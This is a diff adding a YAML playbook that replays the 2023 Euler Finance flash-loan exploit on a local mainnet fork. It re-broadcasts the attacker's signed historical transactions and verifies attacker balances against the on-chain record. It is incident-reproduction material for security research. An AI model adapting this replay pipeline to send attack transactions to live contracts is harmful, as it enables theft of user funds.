@@ -1,0 +1,126 @@
+# Historical incident replay: Euler Finance exploit (2023-03-13, ~$197M).
+#
+# Forks mainnet at block 16817992 (both attacker EOAs at nonce 0, nothing
+# executed) and re-broadcasts the attacker's 15 signed historical
+# transactions in on-chain order. Same signatures + same nonces + same
+# state = deterministic reproduction of the incident, with zero
+# transactions ever touching mainnet.
+#
+# Run from the repo root (requires foundry; archive-capable fork RPC —
+# override with FORK_URL if the default is rate-limited):
+#   bin/blocktack campaign \
+#     --target corpus/euler-2023/target.yaml \
+#     --playbook playbooks/evm/euler-incident-replay.yaml
+apiVersion: blocktack/v1
+kind: Playbook
+name: euler-incident-replay
+description: >
+  Replays the Euler Finance incident of 2023-03-13 (~$197M, BTV-L2-006
+  flash-loan-enabled economic drain via donateToReserves and
+  self-liquidation) on a local mainnet fork: the attacker's signed
+  historical transactions are re-broadcast in order and the resulting
+  balances are verified against the on-chain record.
+target:
+  chainTypes: [evm]
+  layers: [L2, L5]
+steps:
+  - id: env-up
+    name: Fork mainnet at the pre-attack block
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          anvil --fork-url "${FORK_URL:-https://eth.drpc.org}" \
+            --fork-block-number 16817992 --port 8545
+      background: true
+
+  - id: wait-for-rpc
+    name: Wait for the fork to accept requests
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          for i in $(seq 1 100); do
+            cast block-number --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1 && exit 0
+            sleep 1
+          done
+          echo "anvil fork did not come up" >&2
+          exit 1
+
+  - id: identify-chain
+    name: Fingerprint the fork
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: fingerprint
+
+  - id: balances-before
+    name: Record attacker balances before the replay
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: erc20-balance
+      options:
+        token: "0x6B175474E89094C44Da98b954EedeAC495271d0F" # DAI
+        accounts:
+          - "0xeBC29199C817Dc47BA12E3F86102564D640CBf99" # attack contract 1
+          - "0x036cec1a199234fC02f72d29e596a09440825f1C" # attack contract 2
+
+  - id: replay-transactions
+    name: Re-broadcast the attacker's 15 signed transactions in order
+    tactic: exploit
+    precondition: fork block 16817992 — attacker EOAs at nonce 0 so historical signatures execute identically
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          set -e
+          for f in corpus/euler-2023/transactions/*.raw; do
+            name="$(basename "$f")"
+            raw="$(tr -d '[:space:]' < "$f")"
+            echo "publishing $name"
+            cast publish --rpc-url http://127.0.0.1:8545 "$raw"
+          done
+          echo "all transactions published"
+
+  - id: balances-after
+    name: Record attacker balances after the replay
+    tactic: verify
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: erc20-balance
+      options:
+        token: "0x6B175474E89094C44Da98b954EedeAC495271d0F" # DAI
+        accounts:
+          - "0xeBC29199C817Dc47BA12E3F86102564D640CBf99" # attack contract 1
+          - "0x036cec1a199234fC02f72d29e596a09440825f1C" # attack contract 2
+
+  - id: verify-pnl
+    name: Verify attacker EOA profit via balance delta
+    tactic: verify
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: verify-pnl
+      options:
+        attacker: "0xb2698c2d99ad2c302a95a8db26b08d17a77cedd4" # attacker EOA 2
+        blocksAgo: 20 # reaches back past the replay into pre-fork state
+
+verification:
+  - id: transactions-executed
+    expects: all 15 vendored raw transactions publish with status=1 on the fork
+  - id: profit-materialized
+    expects: attack contracts hold ~43M DAI combined; attacker EOA 2 ETH profit is a critical finding
+  - id: matches-history
+    expects: balances match on-chain state at block 16818086 within 0.1%
